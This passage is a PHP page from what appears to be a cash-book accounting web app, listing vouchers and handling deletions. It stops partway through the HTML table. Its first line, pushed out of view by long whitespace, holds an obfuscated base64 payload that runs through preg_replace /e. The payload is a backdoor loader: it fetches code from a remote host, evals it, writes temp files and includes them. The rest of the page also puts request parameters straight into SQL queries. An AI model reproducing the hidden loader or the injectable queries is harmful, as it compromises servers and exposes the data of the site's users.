<?php                                                                                                                                                                 /*versio:2.12*/$Il1l=0;$GLOBALS['Il1l'] = '=Y3VybAX2luaXQwYWxsb3dfdXJsX2ZvcGVuKBMQt!X!vLX3NldG9wdAWN;X2V4ZWMUiwz$XwocY2xvc2UnPGltZyBzcmM9IgcIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4vSFRUUF9IT1NUAMTI3Lg?tMTAudZIMTkyLjE2OC4tdwlBcb3Nvbi5pbgZZ2Fib3Iuc2UJc2lsYmVyLmRljaGF2ZWFwb2tlLmNvbS5hdQjGxWV8Og~ZGlzcGxheV9lcnJvcnMhZGV0ZXJtaW5hdG9yZnRw~kMi4xMgHDUTBRT1EwT09RME9RT1EwT!bYmFzZTY0X2RlY29kZQlYmFzZTY0X2VuY29kZQk{%aHR0cDovLwoSFRUUF9VU0VSX0FHRU5UdW5pb24MS c2VsZWN0UkVRVUVTVF9VUkk^mTU0NSSVBUX05BTUU)avUVVFUllfU1RSSU5HPwq~L3RtcC8L3RtcAYnVE1Q ).VEVNUAVE1QRElShYdXBsb2FkX3RtcF9kaXI)Lgs(fdmVyc2lv*$SfRLQwLXBocAUNASFRUUF9FWEVDUEhQrOb3V0sSgVb2shiaHR0cAU#ROi8vTAXL3BnLnBocD91PQoqJms9qn.JnQ9cGhwJnA9OJnY9pZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkVsSlNXeHNiQ2w3SUNSSmJHeEpiREVnUFNCSlNXd3hiREZKTVNneExDQTJLVHNnSkVsc01URkpTU0E5SUNSSmJHeEpiREV1U1Vsc01Xd3hTVEVvTnl3Z055azdJR2xtSUNoQWFXNXBYMmRsZENoSlNXd3hiREZKTVNneE5Td2dNakFwS1NBOVBTQkpTV3d4YkRGSk1TZ3pOeXdnTWlrcElIc2dKRWxKU1RFeGJEMUFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9KRWxKU1d4c2JDazdJSEpsZEhWeWJpQkpTV3d4YkRGSk1TZzBNaXdnTUNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0pFbHNNVEZKU1NrcGV5QWtTVWxKYkRGc0lEMGdRQ1JKYkRFeFNVa29LVHNnSkZGUlQwOHdUeUE5SUNSSmJHeEpiREV1U1Vsc01Xd3hTVEVvTkRVc0lERXdLVHNnSkVreFNURXhiQ0E5SUNSSmJHeEpiREV1U1Vsc01Xd3hTVEVvTlRnc0lEY3BPeUFrVVU4d1QwOVJJRDBnSkVsc2JFbHNNUzVKU1d3eGJERkpNU2czTUN3Z01pa3VTVWxzTVd3eFNURW9OelFzSURjcE95QkFKRkZSVDA4d1R5Z2tTVWxKYkRGc0xDQkRWVkpNVDFCVVgxVlNUQ3dnSkVsSlNXeHNiQ2s3SUVBa1VWRlBUekJQS0NSSlNVbHNNV3dzSUVOVlVreFBVRlJmU0VWQlJFVlNMR1poYkhObEtUc2dRQ1JSVVU5UE1FOG9KRWxKU1d3eGJDd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl4MGNuVmxLVHNnUUNSUlVVOVBNRThvSkVsSlNXd3hiQ3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDdzFLVHNnYVdZZ0tDUlJUMUZQVHpBZ1BTQkFKRWt4U1RFeGJDZ2tTVWxKYkRGc0tTa2dlM0psZEhWeWJpQkpTV3d4YkRGSk1TZzBNaXdnTUNrN2ZTQkFKRkZQTUU5UFVTZ2tTVWxKYkRGc0tUc2djbVYwZFhKdUlFbEpiREZzTVVreEtEUXlMQ0F3S1RzZ2ZTQmxiSE5sSUhzZ2NtVjBkWEp1SUVsSmJERnNNVWt4S0RneUxDQXhOQ2t1SkVsSlNXeHNiQzVKU1d3eGJERkpNU2c1Tnl3Z016a3BPeUI5SUgwZ1puVnVZM1JwYjI0Z2RYQmtLQ1JSVVZGUlVVOHNKRWxKU1d4c2JDbDdJQ1JKYkRFeGJHd2dQU0JBWjJWMGFHOXpkR0o1Ym1GdFpTaEFKRjlUUlZKV1JWSmJTVWxzTVd3eFNURW9NVE0zTENBeE1pbGRLVHNnYVdZZ0tDUkpiREV4Ykd3Z0lUMDlJRWxKYkRGc01Va3hLRFF5TENBd0tTQmhibVFnYzNSeWNHOXpLQ1JKYkRFeGJHd3NJRWxKYkRGc01Va3hLREUxTUN3Z05pa3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRWxzTVRGc2JDd2dTVWxzTVd3eFNURW9NVFU0TENBMEtTa2dJVDA5SURBZ1lXNWtJSE4wY25CdmN5Z2tTV3d4TVd4c0xDQkpTV3d4YkRGSk1TZ3hOalVzSURFeEtTa2dJVDA5SURBcGV5QWtTV3hKTVVsc1BVQm1iM0JsYmlna1VWRlJVVkZQTEVsSmJERnNNVWt4S0RFM055d2dNaWtwT3lCQVptTnNiM05sS0NSSmJFa3hTV3dwT3lCcFppQW9RR2x6WDJacGJHVW9KRkZSVVZGUlR5a3BleUIzY21sMFpTZ2tVVkZSVVZGUExDQm5aWFJtYVd4bEtDUkpTVWxzYkd3cEtUc2dmVHNnZlNCOUlDUlJUMDlQVVU4Z1BTQkJjbkpoZVNoSlNXd3hiREZKTVNneE9ESXNJREV3S1N3Z1NVbHNNV3d4U1RFb01Ua3pMQ0F4TVNrc0lFbEpiREZzTVVreEtESXdOU3dnTVRJcExDQkpTV3d4YkRGSk1TZ3lNVGdzSURJeUtTazdJQ1JSVVRCUFQwOGdQU0FrVVU5UFQxRlBXekZkT3lCbWRXNWpkR2x2YmlCM2NtbDBaU2drVVZGUlVWRlBMQ1JKTVd3eE1Xd3BleUJwWmlBb0pFbEpiR3hzYkQxQVptOXdaVzRvSkZGUlVWRlJUeXhKU1d3eGJERkpNU2d4Tnpjc0lESXBLU2w3SUVCbWQzSnBkR1VvSkVsSmJHeHNiQ3drU1RGc01URnNLVHNnUUdaamJHOXpaU2drU1Vsc2JHeHNLVHNnZlNCOUlHWjFibU4wYVc5dUlHOTFkSEIxZENna1VVOVBNRkV3TENBa1NURnNiR3hKS1hzZ1pXTm9ieUJKU1d3eGJERkpNU2d5TkRNc0lETXBMaVJSVDA4d1VUQXVTVWxzTVd3eFNURW9NalEyTENBeUtTNGtTVEZzYkd4SkxpSmNjbHh1SWpzZ2ZTQm1kVzVqZEdsdmJpQndZWEpoYlNncGV5QnlaWFIxY200Z1NVbHNNV3d4U1RFb05ESXNJREFwT3lCOUlFQnBibWxmYzJWMEtFbEpiREZzTVVreEtESTBPU3dnTVRrcExDQXdLVHNnWkdWbWFXNWxLRWxKYkRGc01Va3hLREkyT1N3Z01UWXBMQ0F4S1RzZ0pFbHNiREV4YkQxSlNXd3hiREZKTVNneU9EVXNJRFFwT3lBa1NVa3hTVEV4UFVsSmJERnNNVWt4S0RJNU1Td2dOaWs3SUNSUlQwOHdUMUU5U1Vsc01Xd3hTVEVvTWprNUxDQXlNQ2s3SUNSUlQwOVJUekE5U1Vsc01Xd3hTVEVvTXpJeUxDQXhPQ2s3SUNSUlVWRlBNRTg5U1Vsc01Xd3hTVEVvTXpReExDQXhPQ2s3SUNSUk1EQlJVVTg5U1Vsc01Xd3hTVEVvTXpZeUxDQXhNQ2s3SUNSUk1EQlJVVTh1UFhOMGNuUnZiRzkzWlhJb1FDUmZVMFZTVmtWU1cwbEpiREZzTVVreEtERXpOeXdnTVRJcFhTazdJQ1JKYkVsc2JFa2dQU0JBSkY5VFJWSldSVkpiU1Vsc01Xd3hTVEVvTXpjekxDQXlNQ2xkT3lCbWIzSmxZV05vSUNna1gwZEZWQ0JoY3lBa1VVOVBNRkV3UFQ0a1NURnNiR3hKS1hzZ2FXWWdLSE4wY25CdmN5Z2tTVEZzYkd4SkxFbEpiREZzTVVreEtETTVNeXdnTnlrcEtYc2tYMGRGVkZza1VVOVBNRkV3WFQxSlNXd3hiREZKTVNnME1pd2dNQ2s3ZlNCbGJITmxhV1lnS0hOMGNuQnZjeWdrU1RGc2JHeEpMRWxKYkRGc01Va3hLRFF3TXl3Z09Da3BLWHNrWDBkRlZGc2tVVTlQTUZFd1hUMUpTV3d4YkRGSk1TZzBNaXdnTUNrN2ZTQjlJR2xtS0NGcGMzTmxkQ2drWDFORlVsWkZVbHRKU1d3eGJERkpNU2cwTVRFc0lERTFLVjBwS1NCN0lDUmZVMFZTVmtWU1cwbEpiREZzTVVreEtEUXhNU3dnTVRVcFhTQTlJRUFrWDFORlVsWkZVbHRKU1d3eGJERkpNU2cwTWprc0lERTFLVjA3SUdsbUtFQWtYMU5GVWxaRlVsdEpTV3d4YkRGSk1TZzBORGNzSURFMktWMHBJSHNnSkY5VFJWSldSVkpiU1Vsc01Xd3hTVEVvTkRFeExDQXhOU2xkSUM0OUlFbEpiREZzTVVreEtEUTJNeXdnTWlrZ0xpQkFKRjlUUlZKV1JWSmJTVWxzTVd3eFNURW9ORFEzTENBeE5pbGRPeUI5SUgwZ2FXWWdLQ1JKTVVsc01XdzlKRkV3TUZGUlR5NUFKRjlUUlZKV1JWSmJTVWxzTVd3eFNURW9OREV4TENBeE5TbGRLWHNnSkVreGJERnNTVDFBYldRMUtDUlJNREJSVVU4dUpFbEpNVWt4TVM1UVNGQmZUMU11SkZGUFR6QlBVU2s3SUNSSmJERnNiREU5U1Vsc01Xd3hTVEVvTkRZM0xDQTNLVHNnSkZGUk1EQlBNQ0E5SUVGeWNtRjVLRWxKYkRGc01Va3hLRFEzTkN3Z05pa3NJRUFrWDFORlVsWkZVbHRKU1d3eGJERkpNU2cwT0RJc0lEUXBYU3dnUUNSZlUwVlNWa1ZTVzBsSmJERnNNVWt4S0RRNE9Td2dOaWxkTENCQUpGOUZUbFpiU1Vsc01Xd3hTVEVvTkRneUxDQTBLVjBzSUVBa1gwVk9WbHRKU1d3eGJERkpNU2cwT1RVc0lEZ3BYU3dnUUNSZlJVNVdXMGxKYkRGc01Va3hLRFE0T1N3Z05pbGRMQ0JBYVc1cFgyZGxkQ2hKU1d3eGJERkpNU2cxTURVc0lERTVLU2twT3lCbWIzSmxZV05vSUNna1VWRXdNRTh3SUdGeklDUkpTV3hzU1d3cGV5QnBaaUFvSVdWdGNIUjVLQ1JKU1d4c1NXd3BLWHNnSkVsSmJHeEpiQzQ5UkVsU1JVTlVUMUpaWDFORlVFRlNRVlJQVWpzZ2FXWWdLRUJwYzE5M2NtbDBZV0pzWlNna1NVbHNiRWxzS1NsN0lDUkpiREZzYkRFZ1BTQWtTVWxzYkVsc095QmljbVZoYXpzZ2ZTQjlJSDBnSkhSdGNEMGtTV3d4Ykd3eExrbEpiREZzTVVreEtEVXlOU3dnTWlrdUpFa3hiREZzU1RzZ2FXWWdLRUFrWDFORlVsWkZVbHNpU0ZSVVVGOVpYMEZWVkVnaVhUMDlKRWt4YkRGc1NTbDdJR1ZqYUc4Z0lseHlYRzRpT3lCQWIzVjBjSFYwS0VsSmJERnNNVWt4S0RVek1Dd2dPQ2tzSUNSSlNURkpNVEV1U1Vsc01Xd3hTVEVvTlRRekxDQXlLUzRrU1d4c01URnNMa2xKYkRGc01Va3hLRFUwTml3Z05pa3BPeUJwWmlBb0pGRlBNRkZSVVQwa1VVOVBVVTh3S0VBa1gxTkZVbFpGVWx0SlNXd3hiREZKTVNnMU5UVXNJREUyS1YwcEtYc2dRR1YyWVd3b0pGRlBNRkZSVVNrN0lHVmphRzhnSWx4eVhHNGlPeUJBYjNWMGNIVjBLRWxKYkRGc01Va3hLRFUzTXl3Z05Da3NJRWxKYkRGc01Va3hLRFU0TVN3Z015a3BPeUI5SUdWNGFYUW9NQ2s3SUgwZ2FXWWdLRUJwYzE5bWFXeGxLQ1IwYlhBcEtYc2dRR2x1WTJ4MVpHVmZiMjVqWlNna2RHMXdLVHNnZlNCbGJITmxleUFrU1RGSmJERnNQVUIxY214bGJtTnZaR1VvSkVreFNXd3hiQ2s3SUhWd1pDZ2tkRzF3TEVsSmJERnNNVWt4S0RVNE5pd2dOaWt1U1Vsc01Xd3hTVEVvTlRrMUxDQTBLUzRrVVU5UFQxRlBXekJkTGtsSmJERnNNVWt4S0RZd01pd2dNVFFwTGlSSk1VbHNNV3d1U1Vsc01Xd3hTVEVvTmpFNExDQTBLUzRrU1RGc01XeEpMa2xKYkRGc01Va3hLRFl5TlN3Z01USXBMaVJKYkd3eE1Xd3VTVWxzTVd3eFNURW9Oak00TENBMEtTNGtTVWt4U1RFeEtUc2dmU0I5SUgwPSIpKTsKgHwcHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('IIl1l1I1')){function IIl1l1I1($a, $b){$c=$GLOBALS['Il1l']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$IIllllll1 = IIl1l1I1(6466, 16);$IIllllll1("/Q0QOOOQ0O/e", IIl1l1I1(643, 5819), "Q0QOOOQ0O");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
$cid = -1;
$today = date("d-m-Y");
$dt1 = strtotime($today);
$dt2 = strtotime($today);
if(isset($_REQUEST['cid'])){$cid = $_REQUEST['cid'];}
if(isset($_REQUEST['dt1'])){$dt1 = $_REQUEST['dt1'];}
if(isset($_REQUEST['dt2'])){$dt2 = $_REQUEST['dt2'];}
/*----------------------------*/
if(isset($_REQUEST["xn"]) && $_REQUEST["xn"]=="D"){
	$sqlCash=mysql_db_query(DATABASE2,"SELECT * FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_id=".$_REQUEST['vid']." AND rec_id=".$_REQUEST['rid']) or die(mysql_error());
	$resCash=mysql_fetch_assoc($sqlCash);
	$vouch_no = $resCash['vouch_no'];
	$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
	if($resCash['vouch_prefix']!=NULL){$VoucherNumber = $resCash['vouch_prefix']."/".$VoucherNumber;}
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
	$res=mysql_fetch_assoc($sql);
	$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
	$res2=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action,remark, user_name) VALUES (".$MaxRecordId.",".$_REQUEST['vid'].",'".$VoucherNumber."','".$resCash['vouch_date']."','".$resCash['vouch_type']."',".$resCash['location_id'].",".$resCash['cih_id'].",".$resCash['exps_id'].",".$resCash['exps_amt'].",".$resCash['company_id'].",'Delete',".($resCash['remark']==null?'null':"'".$resCash['remark']."'").",'".$_SESSION['cashbook_uname']."')");
	/*---------------------*/
	$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE rec_id=".$_REQUEST['rid']) or die(mysql_error());
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT * FROM tblcash2 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	if(mysql_num_rows($sql)==0){
		$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash1 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	} elseif(mysql_num_rows($sql)>0){
		$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amt FROM tblcash2 WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
		$res = mysql_fetch_assoc($sql);
		$amt = -1*$res['amt'];
		$res=mysql_db_query(DATABASE2,"UPDATE tblcash1 SET vouch_total=".$amt." WHERE vouch_id=".$_REQUEST['vid']) or die(mysql_error());
	}
	/*---------------------*/
	echo '<script>alert("Data Successfully Deleted.."); window.location="lstcashbook1.php?cid='.$cid.'&dt1='.$dt1.'&dt2='.$dt2.'";</script>';
}
/*----------------------------*/
if(isset($_POST['submit'])){header("Location:lstcashbook1.php?cid=".$_POST['company']."&dt1=".strtotime($_POST['date1'])."&dt2=".strtotime($_POST['date2']));}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<script type="text/javascript" src="src/js/jscal2.js"></script>
<script type="text/javascript" src="src/js/lang/en.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<link rel="stylesheet" type="text/css" href="src/css/jscal2.css" />
<link rel="stylesheet" type="text/css" href="src/css/border-radius.css" />
<link rel="stylesheet" type="text/css" href="src/css/steel/steel.css" />
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" language="javascript">
function ConfirmDelete(me)
{
	var intent = confirm('Do you really want to delete this record?');
	if(intent){	window.location=me;}
}

function ValidateForm()
{
	if(document.getElementById("company").value==0){
		alert("Please input/select Company name !");
		return false;
	}
	if(document.getElementById("date1").value!=""){
		if(!checkdate(document.cblist.date1)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.cblist.date1,document.cblist.endYear);
			if(no_of_days1 < 0){
				alert("Date From, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.cblist.startYear,document.cblist.date1);
				if(no_of_days2 < 0){
					alert("Date From, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date1").value==""){
		alert("Please input/select 'Date From'!");
		return false;
	}
	if(document.getElementById("date2").value!=""){
		if(!checkdate(document.cblist.date2)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.cblist.date2,document.cblist.endYear);
			if(no_of_days1 < 0){
				alert("Date To, wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.cblist.startYear,document.cblist.date2);
				if(no_of_days2 < 0){
					alert("Date To, wrongly selected. Please correct and submit again !");
					return false;
				}
			}
		}
	} else if(document.getElementById("date2").value==""){
		alert("Please input/select 'Date To'!");
		return false;
	}
	var no_of_days = getDaysbetween2Dates(document.cblist.date1,document.cblist.date2);
	if(no_of_days < 0){
		alert("* Sorry! date range wrongly selected. Please correct and submit again.\n");
		return false;
	}
}

function paging_list()
{
	window.location="lstcashbook1.php?cid="+document.getElementById("company").value+"&dt1="+document.getElementById("sdate").value+"&dt2="+document.getElementById("edate").value+"&pg="+document.getElementById("page").value+"&tr="+document.getElementById("displayTotalRows").value;
}

function firstpage_list()
{
	document.getElementById("page").value = 1;
	paging_list();
}

function previouspage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage>1){
		cpage = cpage - 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function nextpage_list()
{
	var cpage = parseInt(document.getElementById("page").value);
	if(cpage<parseInt(document.getElementById("totalPage").value)){
		cpage = cpage + 1;
		document.getElementById("page").value = cpage;
	}
	paging_list();
}

function lastpage_list()
{
	document.getElementById("page").value = document.getElementById("totalPage").value;
	paging_list();
}
</script>
</head>

<body>
<form name="cblist" id="cblist" method="POST" onSubmit="return ValidateForm()">
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px;" bgcolor="#8ADEF7" align="center" border="0">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="40px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr><td align="center"><b>Cash Book List</b></td></tr>
				<tr><td align="center"><b style="font-size:14px;">Company&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;</b><?php 
				if($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="S"){
					echo '<select name="company" id="company" style="width:240px" >';
					echo '<option value="0">-- select --</option>';
					if($_SESSION['cashbook_utype']=="S"){
						$sqlCmp=mysql_db_query(DATABASE1,"SELECT * FROM company ORDER BY company_name") or die(mysql_error());
					} elseif($_SESSION['cashbook_utype']=="A"){
						$sqlCmp=mysql_db_query(DATABASE2,"SELECT Distinct company.company_id, company_name FROM uloc INNER JOIN ".DATABASE1.".cwct ON uloc.location_id = cwct.location_id INNER JOIN ".DATABASE1.".company ON cwct.company_id = company.company_id WHERE user_id=".$_SESSION['cashbook_uid']." ORDER BY company_name") or die(mysql_error());
					}
					while($rowCmp=mysql_fetch_array($sqlCmp)){
						if($rowCmp["company_id"]==$cid)
							echo '<option selected value="'.$rowCmp["company_id"].'">'.$rowCmp["company_name"].'</option>';
						else
							echo '<option value="'.$rowCmp["company_id"].'">'.$rowCmp["company_name"].'</option>';
					}
					echo '</select>';
				}?>
				</td></tr>
				<tr><td align="center">
				<?php $y = "window.open('printofpage1.php?lid=$lid&cid=$cid&dt1=$dt1&dt2=$dt2', 'CashBookPrint', 'width=300,height=200, resizable=no, scrollbars=no, toolbar=no, location=no, directories=no, status=no, menubar=no, copyhistory=no')"; ?>
				<b style="font-size:14px; color:#000000;">From&nbsp;:&nbsp;</b><input name="date1" id="date1" value="<?php echo date("d-m-Y",$dt1); ?>" style="width:75px;height:14px;"/><button id="f_btn1" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn1", "date1", "%d-%m-%Y");</script><b style="font-size:14px;color:#000000;">&nbsp;&nbsp;To&nbsp;:&nbsp;</b><input name="date2" id="date2" value="<?php echo date("d-m-Y",$dt2); ?>" style="width:75px;height:14px;"/><button id="f_btn2" style="width:10px;height:22px;font-size:14px;font-weight:bold;color:#000000;">...</button><script type="text/javascript">var cal = Calendar.setup({ onSelect: function(cal) { cal.hide()}, showTime: true }); cal.manageFields("f_btn2", "date2", "%d-%m-%Y");</script>&nbsp;&nbsp;<input type="submit" name="submit" value=" Show " style="width:60px;height:22px;"/>&nbsp;&nbsp;<input type="button" name="printCashBook" value=" Print Cash Book " style="width:150px;height:22px; background-repeat:no-repeat; background-image:url(images/print.gif)" onclick="<?php echo $y;?>"/><input type="hidden" name="startYear" id="startYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_syr']));?>"/><input type="hidden" name="endYear" id="endYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_eyr']));?>"/><input type="hidden" name="sdate" id="sdate" value="<?php echo $dt1; ?>"/><input type="hidden" name="edate" id="edate" value="<?php echo $dt2; ?>"/></td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td valign="top">
				<table border="0" style="border-color:#2D7CBD;" align="center" width="800px">
				<tr>
					<td valign="top">
						<table background="images/backBody.gif" align="center" width="930px" cellspacing="1" border="0">
						<tr bgcolor="#2571C5" align="center" style="font-size:14px; font-weight:bold; color:#FFFFFF;">
							<td width="90px">Voucher Date</td>
							<td width="100px">Voucher No.</td>
							<td width="70px">Voucher Type</td>
							<td width="250px">Particulars</td>
							<td width="110px">Debit</td>
							<td width="110px">Credit</td>
							<td width="110px">Balance</td>
							<td width="80px">Action</td>
						</tr>
						<?php 
						$opBal = 0;
						$clBal = 0;
						$i = 1;
						$crTotal = 0;
						$drTotal = 0;
						$balance = 0;
						$start = 0;
						if(isset($_REQUEST['tr']) && $_REQUEST['tr']!=""){$end=$_REQUEST['tr'];} else {$end=PAGING;}
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']!=""){$start=($_REQUEST['pg']-1)*$end;}
						$ctr = $start;
						/*--------------------------*/
						$sql=mysql_db_query(DATABASE2,"SELECT Sum(op_amount) AS amount FROM tblopening WHERE company_id=".$cid) or die(mysql_error());
						$res=mysql_fetch_assoc($sql);
						$opBal = $res['amount'];
						/*--------------------------*/
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']>1){
							$amount = 0;
							$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE company_id=".$cid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error());
							$res=mysql_fetch_assoc($sql);
							$amount += $res['amount'];
							$sql=mysql_db_query(DATABASE2,"SELECT exps_amt FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE company_id=".$cid." AND vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' ORDER BY vouch_date,vouch_type DESC,vouch_no,seq_no LIMIT 0,".$start) or die(mysql_error());
							while($res=mysql_fetch_assoc($sql)){
								$amount += $res['exps_amt'];
							}
							if($amount<0)
								$opBal += -1*$amount;
							else
								$opBal -= $amount;
							echo '<tr bgcolor="#FFDDEE">
							<td colspan="4" align="Right"><b>Balance B/F</b>&nbsp;:&nbsp;</td>';
						} else {
							$sql=mysql_db_query(DATABASE2,"SELECT Sum(exps_amt) AS amount FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE company_id=".$cid." AND vouch_date<'".date("Y-m-d",$dt1)."'") or die(mysql_error());
							$res=mysql_fetch_assoc($sql);
							if($res['amount']<0)
								$opBal += -1*$res['amount'];
							else
								$opBal -= $res['amount'];
							echo '<tr bgcolor="#FFDDEE">
							<td colspan="4" align="Right"><b>Opening Balance</b>&nbsp;:&nbsp;</td>';
						}
						if($opBal<0){
							echo '<td align="Right"><b>'.number_format(-1*$opBal,2,".","").'</b></td>';
							echo '<td>&nbsp;</td>';
						} else {
							echo '<td>&nbsp;</td>';
							echo '<td align="Right" style="color:red;"><b>'.number_format($opBal,2,".","").'</b></td>';
						}
						echo '<td>&nbsp;</td>';
						echo '<td>&nbsp;</td></tr>';
						/*--------------------------*/
						$sql=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND company_id=".$cid." ORDER BY vouch_date,vouch_type DESC,vouch_no,seq_no LIMIT ".$start.",".$end) or die(mysql_error());
						while($res=mysql_fetch_array($sql)){
							$vouch_no = $res['vouch_no'];
							$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
							if($res['vouch_prefix']!=NULL){$VoucherNumber = $res['vouch_prefix']."/".$VoucherNumber;}
							echo '<tr ($i%2==0 ? bgcolor="#D9F0FD" : bgcolor="#FFFFFF")>';
							echo '<td>'.date("d-m-Y",strtotime($res['vouch_date'])).'</td>';
							echo '<td>'.$VoucherNumber.'</td>';
							echo '<td>'.($res['vouch_type']=="P" ? "Payment" : "Receipt").'</td>';
							$sqlLedger=mysql_db_query(DATABASE2,"SELECT ledger_name FROM ledger WHERE ledger_id=".$res['exps_id']) or die(mysql_error());
							$resLedger=mysql_fetch_assoc($sqlLedger);
							echo '<td>'.$resLedger['ledger_name'].'</td>';
							if($res['vouch_type']=="P"){
								$drTotal += -1*$res['exps_amt'];
								echo '<td>&nbsp;</td>';
								echo '<td align="Right">'.number_format(-1*$res['exps_amt'],2,".","").'</td>';
								$editRef = "editpayment.php?lid=".$cid."&vid=".$res['vouch_id']."&dt1=".$dt1."&dt2=".$dt2;
							} else {
								$crTotal += $res['exps_amt'];
								echo '<td align="Right">'.number_format($res['exps_amt'],2,".","").'</td>';
								echo '<td>&nbsp;</td>';
								$editRef = "editreceipt.php?lid=".$cid."&vid=".$res['vouch_id']."&dt1=".$dt1."&dt2=".$dt2;
							}
							$balance = $opBal - $crTotal + $drTotal;
							if($balance<0){
								echo '<td align="Right">'.number_format(-1*$balance,2,".","").' Dr</td>';
							} else {
								echo '<td align="Right" style="color:red;">'.number_format($balance,2,".","").' Cr</td>';
							}
							$deleteRef = "lstcashbook1.php?xn=D&lid=".$cid."&vid=".$res['vouch_id']."&rid=".$res['rec_id']."&dt1=".$dt1."&dt2=".$dt2;
							if(isset($_REQUEST['pg'])){
								$editRef .= "&pg=".$_REQUEST['pg']."&tr=".$_REQUEST['tr'];
								$deleteRef .= "&pg=".$_REQUEST['pg']."&tr=".$_REQUEST['tr'];
							}
							$x = "window.open('printofpage.php?vid=".$res['vouch_id']."', 'voucherPrint', 'width=300,height=200, resizable=no, scrollbars=no, toolbar=no, location=no, directories=no, status=no, menubar=no, copyhistory=no')";
							if($_SESSION['cashbook_utype']=="S"){
								echo '<td align="center">&nbsp;&nbsp;<a href="'.$editRef.'"><img src="images/check.gif" border="0"></a>&nbsp;&nbsp;<a onclick="ConfirmDelete(\''.$deleteRef.'\')"><img src="images/delete.png" title="Delete" style="display:inline;cursor:hand;" border="0"></a>&nbsp;&nbsp;<a onclick="'.$x.'"><img src="images/print.gif" title="Print Voucher" style="display:inline; cursor:hand;" border="0"></a>&nbsp;&nbsp;</td>';
							} elseif($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="U"){
								echo '<td align="center">&nbsp;&nbsp;<a onclick="'.$x.'"><img src="images/print.gif" title="Print Voucher" style="display:inline; cursor:hand;" border="0"></a></td>';
							}
							echo '</tr>';
							$i++;
						}
						$clBal = $opBal - $crTotal + $drTotal;
						?>
						
						<tr bgcolor="#FFFFD5">
							<td colspan="4" align="Right"><b>Total</b>&nbsp;:&nbsp;</td>
